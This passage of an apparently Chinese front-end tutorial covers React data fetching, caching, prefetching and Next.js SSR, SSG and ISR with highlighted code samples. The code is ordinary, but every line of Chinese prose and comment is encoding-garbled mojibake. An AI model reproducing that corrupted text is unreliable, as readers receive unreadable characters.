class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        );</span><br><span class="language-xml">      &#125;&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">FixedSizeList</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>è¯·æ±‚å–æ¶ˆä¸åƒåœ¾å›æ”¶</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// AbortController å–æ¶ˆè¯·æ±‚</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> controller = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>();<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchData</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(url, &#123;<br>        <span class="hljs-attr">signal</span>: controller.<span class="hljs-property">signal</span><br>      &#125;);<br>      <span class="hljs-comment">// å¤„ç†å“åº”</span><br>    &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>      <span class="hljs-keyword">if</span> (err.<span class="hljs-property">name</span> === <span class="hljs-string">&#x27;AbortError&#x27;</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Request aborted&#x27;</span>);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// å¤„ç†å…¶ä»–é”™è¯¯</span><br>      &#125;<br>    &#125;<br>  &#125;;<br>  <br>  <span class="hljs-title function_">fetchData</span>();<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> controller.<span class="hljs-title function_">abort</span>();<br>&#125;, [url]);<br><br><span class="hljs-comment">// React Query è‡ªåŠ¨åƒåœ¾å›æ”¶</span><br><span class="hljs-keyword">const</span> queryClient = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryClient</span>(&#123;<br>  <span class="hljs-attr">defaultOptions</span>: &#123;<br>    <span class="hljs-attr">queries</span>: &#123;<br>      <span class="hljs-attr">gcTime</span>: <span class="hljs-number">10</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span> <span class="hljs-comment">// 10åˆ†é’Ÿåæ¸…ç†ç¼“å­˜</span><br>    &#125;<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="æ€§èƒ½ä¼˜åŒ–å®è·µ"><a href="#æ€§èƒ½ä¼˜åŒ–å®è·µ" class="headerlink" title="æ€§èƒ½ä¼˜åŒ–å®è·µ"></a>æ€§èƒ½ä¼˜åŒ–å®è·µ</h3><p><strong>è¯·æ±‚åˆå¹¶ä¸æ‰¹å¤„ç†</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// GraphQL è¯·æ±‚åˆå¹¶</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">GET_USERS</span> = gql`<span class="language-graphql"></span><br><span class="language-graphql">  <span class="hljs-keyword">query</span> GetUsers<span class="hljs-punctuation">(</span><span class="hljs-variable">$ids</span>: <span class="hljs-punctuation">[</span>ID<span class="hljs-punctuation">!</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">!</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">&#123;</span></span><br><span class="language-graphql">    users<span class="hljs-punctuation">(</span><span class="hljs-symbol">ids</span><span class="hljs-punctuation">:</span> <span class="hljs-variable">$ids</span>) <span class="hljs-punctuation">&#123;</span></span><br><span class="language-graphql">      id</span><br><span class="language-graphql">      name</span><br><span class="language-graphql">      email</span><br><span class="language-graphql">    <span class="hljs-punctuation">&#125;</span></span><br><span class="language-graphql">  <span class="hljs-punctuation">&#125;</span></span><br><span class="language-graphql">`</span>;<br><br><span class="hljs-comment">// REST API æ‰¹å¤„ç†ä¸­é—´ä»¶</span><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;/api/batch&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> requests = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(requests.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">&#123; url, method, body &#125;</span>) =&gt;</span> <br>    <span class="hljs-title function_">handleRequest</span>(url, method, body)<br>  )).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">results</span> =&gt;</span> res.<span class="hljs-title function_">json</span>(results));<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>æ•°æ®é¢„å–ç­–ç•¥</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// React Router v6.4+ æ•°æ®é¢„å–</span><br><span class="hljs-keyword">const</span> router = <span class="hljs-title function_">createBrowserRouter</span>([<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&quot;/user/:id&quot;</span>,<br>    <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">UserProfile</span> /&gt;</span></span>,<br>    <span class="hljs-attr">loader</span>: <span class="hljs-title function_">async</span> (&#123; params &#125;) =&gt; &#123;<br>      <span class="hljs-keyword">return</span> queryClient.<span class="hljs-title function_">fetchQuery</span>(<br>        [<span class="hljs-string">&#x27;user&#x27;</span>, params.<span class="hljs-property">id</span>],<br>        <span class="hljs-function">() =&gt;</span> api.<span class="hljs-title function_">get</span>(<span class="hljs-string">`/users/<span class="hljs-subst">$&#123;params.id&#125;</span>`</span>)<br>      );<br>    &#125;<br>  &#125;<br>]);<br><br><span class="hljs-comment">// ç”¨æˆ·æ‚¬åœé¢„å–</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Link</span> </span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/user/123&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">onMouseEnter</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> queryClient.prefetchQuery(</span><br><span class="language-xml">    [&#x27;user&#x27;, 123],</span><br><span class="language-xml">    () =&gt; api.get(&#x27;/users/123&#x27;)</span><br><span class="language-xml">  )&#125;</span><br><span class="language-xml">&gt;</span><br><span class="language-xml">  ç”¨æˆ·èµ„æ–™</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">Link</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><strong>ç¦»çº¿æ•°æ®ç­–ç•¥</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä½¿ç”¨ IndexedDB ç¼“å­˜æ•°æ®</span><br><span class="hljs-keyword">const</span> &#123; data &#125; = <span class="hljs-title function_">useSWR</span>(<span class="hljs-string">&#x27;/api/data&#x27;</span>, fetcher, &#123;<br>  <span class="hljs-attr">onSuccess</span>: <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// ä¿å­˜åˆ° IndexedDB</span><br>    idb.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;cachedData&#x27;</span>, data);<br>  &#125;,<br>  <span class="hljs-attr">fallbackData</span>: <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// ä» IndexedDB è·å–ç¼“å­˜</span><br>    <span class="hljs-keyword">return</span> idb.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;cachedData&#x27;</span>);<br>  &#125;<br>&#125;);<br><br><span class="hljs-comment">// React Query ç¦»çº¿æ¢å¤</span><br><span class="hljs-keyword">const</span> queryClient = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryClient</span>(&#123;<br>  <span class="hljs-attr">defaultOptions</span>: &#123;<br>    <span class="hljs-attr">queries</span>: &#123;<br>      <span class="hljs-attr">networkMode</span>: <span class="hljs-string">&#x27;offlineFirst&#x27;</span>,<br>      <span class="hljs-attr">cacheTime</span>: <span class="hljs-title class_">Infinity</span> <span class="hljs-comment">// æŒä¹…åŒ–ç¼“å­˜</span><br>    &#125;<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="æ€»ç»“-6"><a href="#æ€»ç»“-6" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><ul><li>åŸºç¡€æ–¹æ¡ˆé€‰æ‹©ï¼š<ul><li>ç®€å•åœºæ™¯ï¼šä¼˜å…ˆä½¿ç”¨ fetch</li><li>ä¼ä¸šåº”ç”¨ï¼šæ¨è axios ä½œä¸º HTTP å®¢æˆ·ç«¯</li></ul></li><li>ç°ä»£æ•°æ®ç®¡ç†ï¼š<ul><li>å¤æ‚åº”ç”¨ï¼šé€‰æ‹© React Queryï¼ˆåŠŸèƒ½å…¨é¢ï¼‰</li><li>è½»é‡é¡¹ç›®ï¼šé€‰æ‹© SWRï¼ˆå¿«é€Ÿé›†æˆï¼‰</li></ul></li><li>å…³é”®èƒ½åŠ›ï¼š<ul><li>æ™ºèƒ½ç¼“å­˜ç®¡ç†</li><li>è‡ªåŠ¨è¯·æ±‚é‡è¯•</li><li>ä¹è§‚æ›´æ–°å®ç°</li><li>åˆ†é¡µ&#x2F;æ— é™åŠ è½½</li></ul></li><li>æ€§èƒ½ä¼˜åŒ–ï¼š<ul><li>è¯·æ±‚æ‰¹å¤„ç†</li><li>æ•°æ®é¢„å–</li><li>ç¦»çº¿ç¼“å­˜ç­–ç•¥</li><li>è™šæ‹Ÿåˆ—è¡¨æ¸²æŸ“</li></ul></li><li>é¢è¯•é‡ç‚¹ï¼š<ul><li>è¯·æ±‚ç«æ€è§£å†³æ–¹æ¡ˆ</li><li>ç¼“å­˜ç­–ç•¥è®¾è®¡</li><li>é”™è¯¯å¤„ç†ä¸é‡è¯•æœºåˆ¶</li><li>å¤§å‹æ•°æ®åˆ†é¡µä¼˜åŒ–</li></ul></li></ul><h2 id="6-5-SSR-ä¸-Next-js-åŸºç¡€"><a href="#6-5-SSR-ä¸-Next-js-åŸºç¡€" class="headerlink" title="6.5 SSR ä¸ Next.js åŸºç¡€"></a>6.5 SSR ä¸ Next.js åŸºç¡€</h2><h3 id="SSR-æ ¸å¿ƒæ¦‚å¿µ"><a href="#SSR-æ ¸å¿ƒæ¦‚å¿µ" class="headerlink" title="SSR æ ¸å¿ƒæ¦‚å¿µ"></a>SSR æ ¸å¿ƒæ¦‚å¿µ</h3><p><strong>æ¸²æŸ“æ¨¡å¼å¯¹æ¯”</strong></p><table><thead><tr><th align="left">æ¸²æŸ“æ–¹å¼</th><th align="left">ç‰¹ç‚¹</th><th align="left">SEO</th><th align="left">é¦–å±æ—¶é—´</th><th align="left">é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td align="left">å®¢æˆ·ç«¯æ¸²æŸ“ (CSR)</td><td align="left">æµè§ˆå™¨ä¸‹è½½ JS åæ¸²æŸ“</td><td align="left">å·®</td><td align="left">æ…¢</td><td align="left">åå°ç³»ç»Ÿã€Dashboard</td></tr><tr><td align="left">æœåŠ¡å™¨ç«¯æ¸²æŸ“ (SSR)</td><td align="left">æœåŠ¡å™¨ç”Ÿæˆå®Œæ•´ HTML</td><td align="left">ä¼˜</td><td align="left">å¿«</td><td align="left">å†…å®¹ç½‘ç«™ã€ç”µå•†</td></tr><tr><td align="left">é™æ€ç«™ç‚¹ç”Ÿæˆ (SSG)</td><td align="left">æ„å»ºæ—¶ç”Ÿæˆ HTML</td><td align="left">ä¼˜</td><td align="left">æå¿«</td><td align="left">åšå®¢ã€æ–‡æ¡£ç«™</td></tr><tr><td align="left">å¢é‡é™æ€å†ç”Ÿ (ISR)</td><td align="left">æŒ‰éœ€é‡æ–°ç”Ÿæˆé¡µé¢</td><td align="left">ä¼˜</td><td align="left">å¿«</td><td align="left">åŠ¨æ€å†…å®¹ç«™ç‚¹</td></tr></tbody></table><p><strong>SSR æ ¸å¿ƒä¼˜åŠ¿</strong></p><ul><li>SEO ä¼˜åŒ–ï¼šæœç´¢å¼•æ“å¯ç›´æ¥æŠ“å–å®Œæ•´ HTML å†…å®¹</li><li>æ€§èƒ½æå‡ï¼šå‡å°‘é¦–å±å†…å®¹å¯è§æ—¶é—´ï¼ˆFCPï¼‰</li><li>ç¤¾äº¤åˆ†äº«ä¼˜åŒ–ï¼šç¤¾äº¤åª’ä½“çˆ¬è™«è·å–å®Œæ•´é¡µé¢å†…å®¹</li><li>ä½ç«¯è®¾å¤‡æ”¯æŒï¼šæœåŠ¡å™¨å¤„ç†æ¸²æŸ“å·¥ä½œï¼Œé™ä½å®¢æˆ·ç«¯å‹åŠ›</li></ul><h3 id="Next-js-æ ¸å¿ƒæ¶æ„"><a href="#Next-js-æ ¸å¿ƒæ¶æ„" class="headerlink" title="Next.js æ ¸å¿ƒæ¶æ„"></a>Next.js æ ¸å¿ƒæ¶æ„</h3><p><strong>Next.js æ ¸å¿ƒç‰¹æ€§</strong></p><pre class="mermaid">graph TD    A[Next.js] --> B[è·¯ç”±ç³»ç»Ÿ]    A --> C[æ¸²æŸ“ç­–ç•¥]    A --> D[æ•°æ®è·å–]    A --> E[API è·¯ç”±]    A --> F[ä¼˜åŒ–åŠŸèƒ½]        B --> B1[æ–‡ä»¶ç³»ç»Ÿè·¯ç”±]    B --> B2[åŠ¨æ€è·¯ç”±]    B --> B3[åµŒå¥—è·¯ç”±]        C --> C1[SSG é™æ€ç”Ÿæˆ]    C --> C2[SSR æœåŠ¡å™¨æ¸²æŸ“]    C --> C3[ISR å¢é‡å†ç”Ÿ]        D --> D1[getStaticProps]    D --> D2[getServerSideProps]    D --> D3[getStaticPaths]        E --> E1[æ— æœåŠ¡å™¨ API]    E --> E2[ä¸­é—´ä»¶æ”¯æŒ]        F --> F1[Image ä¼˜åŒ–]    F --> F2[å­—ä½“ä¼˜åŒ–]    F --> F3[è„šæœ¬ä¼˜åŒ–]</pre><p><strong>æ–‡ä»¶ç³»ç»Ÿè·¯ç”±</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">pages/<br>â”œâ”€â”€ index.js          <span class="hljs-comment"># / æ ¹è·¯ç”±</span><br>â”œâ”€â”€ about.js          <span class="hljs-comment"># /about</span><br>â”œâ”€â”€ blog/<br>â”‚   â”œâ”€â”€ index.js      <span class="hljs-comment"># /blog</span><br>â”‚   â”œâ”€â”€ [slug].js     <span class="hljs-comment"># /blog/:slug åŠ¨æ€è·¯ç”±</span><br>â”‚   â””â”€â”€ categories/<br>â”‚       â””â”€â”€ [<span class="hljs-built_in">id</span>].js   <span class="hljs-comment"># /blog/categories/:id åµŒå¥—è·¯ç”±</span><br>â””â”€â”€ api/<br>    â””â”€â”€ user.js       <span class="hljs-comment"># /api/user API è·¯ç”±</span><br></code></pre></td></tr></table></figure><h3 id="æ•°æ®è·å–ç­–ç•¥"><a href="#æ•°æ®è·å–ç­–ç•¥" class="headerlink" title="æ•°æ®è·å–ç­–ç•¥"></a>æ•°æ®è·å–ç­–ç•¥</h3><p><strong>é™æ€ç”Ÿæˆ (SSG)</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é¡µé¢ç»„ä»¶</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Blog</span>(<span class="hljs-params">&#123; posts &#125;</span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">      &#123;posts.map(post =&gt; (</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;post.id&#125;</span>&gt;</span>&#123;post.title&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="language-xml">      ))&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// æ„å»ºæ—¶è·å–æ•°æ®</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getStaticProps</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://api.example.com/posts&#x27;</span>);<br>  <span class="hljs-keyword">const</span> posts = <span class="hljs-keyword">await</span> res.<span class="hljs-title function_">json</span>();<br>  <br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">props</span>: &#123; posts &#125;,<br>    <span class="hljs-attr">revalidate</span>: <span class="hljs-number">60</span> <span class="hljs-comment">// å¯ç”¨ ISRï¼Œ60ç§’åé‡æ–°ç”Ÿæˆ</span><br>  &#125;;<br>&#125;<br><br><span class="hljs-comment">// åŠ¨æ€è·¯ç”±è·¯å¾„ç”Ÿæˆ</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getStaticPaths</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://api.example.com/posts&#x27;</span>);<br>  <span class="hljs-keyword">const</span> posts = <span class="hljs-keyword">await</span> res.<span class="hljs-title function_">json</span>();<br>  <br>  <span class="hljs-keyword">const</span> paths = posts.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">post</span> =&gt;</span> (&#123;<br>    <span class="hljs-attr">params</span>: &#123; <span class="hljs-attr">slug</span>: post.<span class="hljs-property">slug</span> &#125;<br>  &#125;));<br>  <br>  <span class="hljs-keyword">return</span> &#123;<br>    paths,<br>    <span class="hljs-attr">fallback</span>: <span class="hljs-string">&#x27;blocking&#x27;</span> <span class="hljs-comment">// å¤„ç†æœªé¢„ç”Ÿæˆçš„è·¯å¾„</span><br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æœåŠ¡å™¨ç«¯æ¸²æŸ“ (SSR)</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">UserProfile</span>(<span class="hljs-params">&#123; user &#125;</span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>&#123;user.name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;user.bio&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// æ¯æ¬¡è¯·æ±‚æ—¶è·å–æ•°æ®</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getServerSideProps</span>(<span class="hljs-params">context</span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; req, res, params, query &#125; = context;<br>  <br>  <span class="hljs-comment">// åŸºäº cookie è®¤è¯</span><br>  <span class="hljs-keyword">const</span> token = req.<span class="hljs-property">cookies</span>.<span class="hljs-property">authToken</span>;<br>  <br>  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`https://api.example.com/users/<span class="hljs-subst">$&#123;params.id&#125;</span>`</span>, &#123;<br>    <span class="hljs-attr">headers</span>: &#123; <span class="hljs-title class_">Authorization</span>: <span class="hljs-string">`Bearer <span class="hljs-subst">$&#123;token&#125;</span>`</span> &#125;<br>  &#125;);<br>  <br>  <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) &#123;<br>    <span class="hljs-keyword">return</span> &#123;<br>      <span class="hljs-attr">redirect</span>: &#123;<br>        <span class="hljs-attr">destination</span>: <span class="hljs-string">&#x27;/login&#x27;</span>,<br>        <span class="hljs-attr">permanent</span>: <span class="hljs-literal">false</span><br>      &#125;<br>    &#125;;<br>  &#125;<br>  <br>  <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>  <br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">props</span>: &#123; user &#125;<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é«˜çº§æ¸²æŸ“ç­–ç•¥"><a href="#é«˜çº§æ¸²æŸ“ç­–ç•¥" class="headerlink" title="é«˜çº§æ¸²æŸ“ç­–ç•¥"></a>é«˜çº§æ¸²æŸ“ç­–ç•¥</h3><p><strong>å¢é‡é™æ€å†ç”Ÿ (ISR)</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getStaticProps</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://api.example.com/products&#x27;</span>);<br>  <span class="hljs-keyword">const</span> products = <span class="hljs-keyword">await</span> res.<span class="hljs-title function_">json</span>();<br>  <br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">props</span>: &#123; products &#125;,<br>    <span class="hljs-attr">revalidate</span>: <span class="hljs-number">30</span>, <span class="hljs-comment">// æœ€å¤šæ¯30ç§’é‡æ–°ç”Ÿæˆä¸€æ¬¡</span><br>  &#125;;<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getStaticPaths</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">paths</span>: [<br>      &#123; <span class="hljs-attr">params</span>: &#123; <span class="hljs-attr">category</span>: <span class="hljs-string">&#x27;electronics&#x27;</span> &#125; &#125;<br>    ],<br>    <span class="hljs-attr">fallback</span>: <span class="hljs-string">&#x27;blocking&#x27;</span> <span class="hljs-comment">// å…¶ä»–ç±»åˆ«æŒ‰éœ€ç”Ÿæˆ</span><br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æŒ‰éœ€å†éªŒè¯ (On-demand Revalidation)</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// pages/api/revalidate.js</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handler</span>(<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-comment">// æ£€æŸ¥å¯†é’¥</span><br>  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">query</span>.<span class="hljs-property">secret</span> !== process.<span class="hljs-property">env</span>.<span class="hljs-property">REVALIDATE_SECRET</span>) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;Invalid token&#x27;</span> &#125;);<br>  &#125;<br>  <br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">// é‡æ–°éªŒè¯ç‰¹å®šè·¯å¾„</span><br>    <span class="hljs-keyword">await</span> res.<span class="hljs-title function_">revalidate</span>(<span class="hljs-string">&#x27;/blog/&#x27;</span> + req.<span class="hljs-property">query</span>.<span class="hljs-property">slug</span>);<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">revalidated</span>: <span class="hljs-literal">true</span> &#125;);<br>  &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span 